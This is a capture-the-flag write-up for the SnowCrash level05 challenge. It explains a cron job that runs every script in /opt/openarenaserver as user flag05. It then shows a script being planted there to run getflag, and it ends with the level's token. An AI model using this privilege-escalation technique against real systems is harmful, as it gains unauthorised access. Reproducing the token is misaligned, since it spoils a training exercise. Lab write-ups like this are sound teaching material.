# Filter results to find links with "level05" or "flag05"
find / 2>/dev/null | grep "level05"

# Result found
/var/mail/level05

# Cron job entry
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

# Explanation:
- */2 * * * * : This is the cron schedule syntax specifying how often the task should be executed.
- In this case, it's every two minutes, meaning "every minute divisible by two" (0, 2, 4, 6, ..., 58 minutes of each hour).

# su -c "sh /usr/sbin/openarenaserver" - flag05 :
- This is the command that will be executed every time the cron job runs.
- It uses su to run the following command as another user, specifically the user flag05.
- The -c parameter specifies the command to execute: sh /usr/sbin/openarenaserver, which runs the script as flag05.

# In summary, this cron entry indicates that every two minutes, the script /usr/sbin/openarenaserver will be run as user flag05.

level05@SnowCrash:/var/mail$ ls -la /usr/sbin/openarenaserver
# Output showing permissions
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

# We can see that we have no permissions... so let's investigate further

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

# Explanation:
- The for loop iterates over all files in the /opt/openarenaserver/ directory.
- for each file $i found in this directory:
	- It sets the execution time limit to 5 seconds with ulimit -t 5.
	- It runs the file in a verbose mode using Bash (-x): bash -x "$i".
	- It deletes the file using rm -f "$i".

- This script will run all files in /opt/openarenaserver in a bash shell.
- Thus, we should create a bash script to call getflag in /opt/openarenaserver
- We cant execute the script by ourselves, a cron does it regurlaly


# Write the output to a file in /dev/shm (shared memory) OR /tmp/
level05@SnowCrash:~$ echo "getflag > /dev/shm/flag" > /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh

OR
```bash
echo "getflag > /tmp/flagg" > /opt/openarenaserver/getflag.sh
chmod +x /opt/openarenaserver/getflag.sh
```


# View the result
cat /dev/shm/flag # => This reads the execution output from a file in shared memory

OR

cat /tmp/flagg

# Token obtained:
viuaaale9huek52boumoomioc
